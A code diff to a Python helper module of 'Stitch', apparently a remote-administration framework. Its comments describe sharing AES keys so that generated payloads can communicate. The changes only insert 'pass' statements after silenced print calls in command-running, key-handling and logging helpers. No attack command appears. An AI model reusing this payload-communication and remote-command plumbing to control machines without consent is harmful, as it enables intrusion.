@@ -68,6 +68,7 @@ if aes_abbrev not in aes_lib.sections():
 
 def run_command(command):
     try:
+        pass
         # Normalize to list of args; never use a shell
         if isinstance(command, str):
             if windows_client():
@@ -104,6 +105,7 @@ def start_command(command):
                 args = shlex.split(command, posix=False)
                 cmd_list = ['cmd', '/c'] + args if args else ['cmd', '/c']
             else:
+                pass
                 # Drop background token if present
                 args = [tok for tok in shlex.split(command) if tok != '&']
                 cmd_list = args
@@ -151,15 +153,17 @@ def decrypt(enc, aes_key=secret):
     return cipher.decrypt( enc[16:] )
 
 def show_aes():
+    pass
     # st_print('=== Stitch AES Key ===')
     # st_print('   {}'.format(aes_encoded))
-    # st_print('[*] Copy and add this key to another system running Stitch to '\
-              'enable communication from payloads created on this system.\n')
+    # st_print('[*] Copy and add this key to another system running Stitch to '
+    #          'enable communication from payloads created on this system.\n')
 
 def add_aes(key):
     aes_lib = ConfigParser.ConfigParser()
     aes_lib.read(st_aes_lib)
     if len(key) != 44:
+        pass
     # st_print('[!] Invalid AES key. Keys must be 32 bytes after decryption.\n')
     else:
         try:
@@ -169,6 +173,7 @@ def add_aes(key):
     # st_print(err)
         else:
             if len(decr_key) != 32:
+                pass
     # st_print('[!] Invalid AES key. Keys must be 32 bytes after decryption.\n')
             else:
                 aes_abbrev = '{}{}{}{}{}{}{}{}{}{}{}{}{}'.format(
@@ -180,6 +185,7 @@ def add_aes(key):
                     # Getting a key that is almost exactly like one you already
                     # have is unlikely, this is just a precaution
                     if aes_lib.get(aes_abbrev,'aes_key') == key:
+                        pass
     # st_print('[*] The AES key has already been added to this system.\n')
                         return
                 aesfile = open(st_aes_lib,'w')
@@ -276,6 +282,7 @@ def check_int(val):
         is_int = int(val)
         return True
     except ValueError:
+        pass
     # print("{} is not a valid number.").format(val)
         return False
 
@@ -395,6 +402,7 @@ class progress_bar():
         sys.stdout.flush()
 
 def print_border(length,border):
+    pass
     # print(border * length)
 
 def st_logger(resp,log_path,log_name,verbose=True):
